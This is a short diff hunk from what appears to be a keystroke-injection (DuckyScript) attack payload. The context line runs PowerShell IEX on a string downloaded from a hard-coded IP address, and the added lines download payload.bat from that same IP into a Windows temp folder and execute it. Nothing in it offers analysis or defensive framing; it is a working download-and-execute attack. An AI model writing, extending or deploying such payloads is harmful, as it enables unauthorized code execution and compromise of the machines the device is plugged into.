@@ -190,7 +190,9 @@ STRINGLN IEX(New-Object Net.WebClient).DownloadString('http://153.75.82.198/stag
 DELAY 1000
 
 
-
+powershell -c "Invoke-WebRequest -Uri 'http://153.75.82.198/payload.bat' -OutFile 'C:\Windows\Temp\Cache\p.bat'"
+dir C:\Windows\Temp\Cache\
+call C:\Windows\Temp\Cache\p.bat
 
 
 
